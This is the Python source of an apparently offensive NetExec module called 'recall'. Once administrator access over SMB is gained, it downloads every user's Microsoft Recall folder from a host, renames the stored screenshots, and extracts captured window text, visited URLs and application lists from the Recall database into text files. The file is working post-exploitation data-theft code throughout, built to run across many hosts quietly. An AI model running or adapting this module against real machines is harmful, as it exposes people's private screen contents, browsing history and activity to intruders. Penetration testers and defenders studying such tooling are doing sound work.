from impacket import smb, smb3
import ntpath
from os import rename
from os.path import split, join, splitext, dirname, abspath
from glob import glob
from sqlite3 import connect

class NXCModule:
    """
    Recall
    -------
    Module by @Marshall-Hallenbeck (@mjhallenbeck on Twitter)
    Inspired by https://github.com/xaitax/TotalRecall (code my own)
    """

    name = "recall"
    description = "Downloads Microsoft Recall folders for all users"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        self.context = context
        self.logger = context.log
        self.recall_path = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"

    def on_admin_login(self, context, connection):
        output_path = f"recall_{connection.host}"
        self.logger.debug("Getting all user Recall folders")
        recall_folders = connection.conn.listPath("C$", "\\Users\\*")
        self.logger.debug(f"Recall folders: {recall_folders}")
        if not recall_folders:
            self.logger.fail("No Recall folders found!")
        else:
            self.logger.success("Recall folder(s) found, attempting to dump contents")
        
        for recall_folder in recall_folders:
            if not recall_folder.is_directory():
                continue
            folder_name = recall_folder.get_longname()
            self.logger.debug(f"Folder: {folder_name}")
            if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                continue
            
            full_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path))
            self.logger.debug(f"Getting Recall folder {full_path}")
            user_output_dir = join(output_path, folder_name)
            try:
                connection.download_folder(full_path, user_output_dir, True)
            except (smb.SessionError, smb3.SessionError):
                self.logger.debug(f"Folder {full_path} not found!")
                
            self.logger.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
            self.rename_screenshots(user_output_dir)
        
        self.logger.debug("Parsing Recall DB files...")
        db_files = glob(f"{output_path}/*/*/ukg.db")
        for db in db_files:
            self.parse_recall_db(db)

    def parse_recall_db(self, db_path):
        self.logger.debug(f"Parsing Recall database {db_path}")
        parent = abspath(dirname(dirname(db_path)))
        self.logger.debug(f"Parent: {parent}")
        conn = connect(db_path)
        c = conn.cursor()

        win_text_cap_tab = "WindowCaptureTextIndex_content"
        joined_q = f"""
        SELECT t1.c1, t2.c2
        FROM {win_text_cap_tab} AS t1
        JOIN {win_text_cap_tab} AS t2 ON t1.c0 = t2.c0
        WHERE t1.c1 IS NOT NULL AND t2.c2 IS NOT NULL;
        """
        c.execute(joined_q)
        window_content = c.fetchall()
        with open(join(parent, "window_content.txt"), "w") as file:
            file.writelines(f"{row[0]}, {row[1]}\n" for row in window_content)

        window_q = f"SELECT c1 FROM {win_text_cap_tab} WHERE c1 IS NOT NULL;"
        c.execute(window_q)
        windows = c.fetchall()
        with open(join(parent, "windows.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in windows)

        content_q = f"SELECT c2 FROM {win_text_cap_tab} WHERE c2 IS NOT NULL;"
        c.execute(content_q)
        content = c.fetchall()
        with open(join(parent, "content.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in content)
        
        web_tab = "Web"
        web_q = f"""
        SELECT Uri FROM {web_tab};
        """
        c.execute(web_q)
        uris = c.fetchall()
        with open(join(parent, "uris.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in uris)
            
        app_tab = "App"
        app_q = f"""
        SELECT Name, WindowsAppId, Path FROM {app_tab};
        """
        c.execute(app_q)
        apps = c.fetchall()
        with open(join(parent, "apps.txt"), "w") as file:
            file.writelines(f"{row[0]}, {row[1]}, {row[2]}\n" for row in apps)

    
    def rename_screenshots(self, path):
        self.logger.debug(f"Renaming screenshots at {path}")
        files = glob(f"{path}/*/ImageStore/*")
        self.logger.debug(f"Files to rename: {files}")
        for file in files:
            directory, filename = split(file)
            if not splitext(filename)[1]:
                rename(file, join(directory, f"{filename}.jpg"))
